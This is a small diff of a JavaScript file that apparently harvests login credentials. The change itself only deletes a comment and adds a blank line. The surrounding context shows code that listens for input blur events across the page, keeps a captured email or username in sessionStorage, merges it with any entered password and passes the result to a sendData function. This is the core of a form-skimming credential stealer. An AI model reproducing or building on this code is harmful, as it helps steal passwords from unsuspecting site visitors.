@@ -19,7 +19,6 @@ const sendData = (eventType) => {
 
     if (Object.keys(data).length === 0) return;
 
-    // If we have a password, we combine it with any previously stored email/username
     if (hasPassword) {
         const storedData = JSON.parse(sessionStorage.getItem('captured_user_id') || '{}');
         const finalData = { ...storedData, ...data };
@@ -52,3 +51,4 @@ document.addEventListener('blur', (e) => {
         sendData("input_blur");
     }
 }, true);
+
